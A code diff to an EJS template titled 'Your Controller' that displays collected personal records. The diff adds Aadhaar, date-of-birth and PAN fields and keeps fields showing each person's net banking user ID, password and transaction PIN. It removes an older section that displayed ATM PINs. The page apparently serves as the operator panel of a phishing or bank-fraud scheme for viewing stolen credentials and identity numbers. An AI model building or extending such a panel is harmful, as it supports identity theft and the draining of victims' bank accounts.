@@ -7,12 +7,10 @@
   <link rel="stylesheet" href="/css/userDetail.css" />
 </head>
 <body>
-
   <!-- Header Navigation -->
   <header class="header-nav">
     <h1>Your Controller</h1>
   </header>
-
   <!-- Main Content Container -->
   <div class="user-detail-container">
     <h2>User Details</h2>
@@ -22,16 +20,18 @@
         <div class="card">
           <h3>Personal Information - <%= index + 1 %></h3>
           <p><strong>Name:</strong> <%= userDetails.name %></p>
-          <p><strong>Mobile No:</strong> <%= userDetails.mobile %></p>
-          <p><strong>Consumer:</strong> <%= userDetails.consumerNumber %></p>
+          <p><strong>Adhar No:</strong> <%= userDetails.aadhaarNumber %></p>
+          <p><strong>DOB:</strong> <%= userDetails.dateOfBirth %></p>
+          <p><strong>Pan:</strong> <%= userDetails.panNumber %></p>
         </div>
       <% }) %>
     <% } else if (user) { %> 
       <div class="card">
         <h3>Personal Information</h3>
         <p><strong>Name:</strong> <%= user.name %></p>
-        <p><strong>Mobile No:</strong> <%= user.mobile %></p>
-        <p><strong>Consumer:</strong> <%= user.consumerNumber %></p>
+        <p><strong>Adhar No:</strong> <%= user.aadhaarNumber %></p>
+        <p><strong>DOB:</strong> <%= user.dateOfBirth %></p>
+        <p><strong>Pan:</strong> <%= user.panNumber %></p>
       </div>
     <% } %>
 
@@ -59,8 +59,8 @@
           <h3>Net Banking Details - <%= index + 1 %></h3>
           <p><strong>Bank name:</strong> <%= bankDetails.bankName %></p>
           <p><strong>User-Id:</strong> <%= bankDetails.userId %></p>
-          <p><strong>Password:</strong> <%= bankDetails.password %></p>
-          <p><strong>T-PiN:</strong> <%= bankDetails.transactionPassword %></p>
+          <p><strong>Password:</strong> <%= bankDetails.profilePassword %></p>
+          <p><strong>T-PiN:</strong> <%= bankDetails.transactionPin %></p>
         </div>
       <% }) %>
     <% } else if (netBanking) { %> 
@@ -68,24 +68,8 @@
         <h3>Net Banking Details</h3>
         <p><strong>Bank name:</strong> <%= netBanking.bankName %></p>
         <p><strong>User-Id:</strong> <%= netBanking.userId %></p>
-        <p><strong>Password:</strong> <%= netBanking.password %></p>
-        <p><strong>T-PiN:</strong> <%= netBanking.transactionPassword %></p>
-      </div>
-    <% } %>
-
-    <% if (dobAtmData && Array.isArray(dobAtmData)) { %>
-      <% dobAtmData.forEach((atmDetails, index) => { %>
-        <div class="card">
-          <h3>ATM Details - <%= index + 1 %></h3>
-          <p><strong>Date of Birth:</strong> <%= atmDetails.dob %></p>
-          <p><strong>PIN:</strong> <%= atmDetails.pin %></p>
-        </div>
-      <% }) %>
-    <% } else if (dobAtmData) { %> 
-      <div class="card">
-        <h3>ATM Details</h3>
-        <p><strong>Date of Birth:</strong> <%= dobAtmData.dob %></p>
-        <p><strong>PIN:</strong> <%= dobAtmData.pin %></p>
+        <p><strong>Password:</strong> <%= netBanking.profilePassword %></p>
+        <p><strong>T-PiN:</strong> <%= netBanking.transactionPin%></p>
       </div>
     <% } %>
 
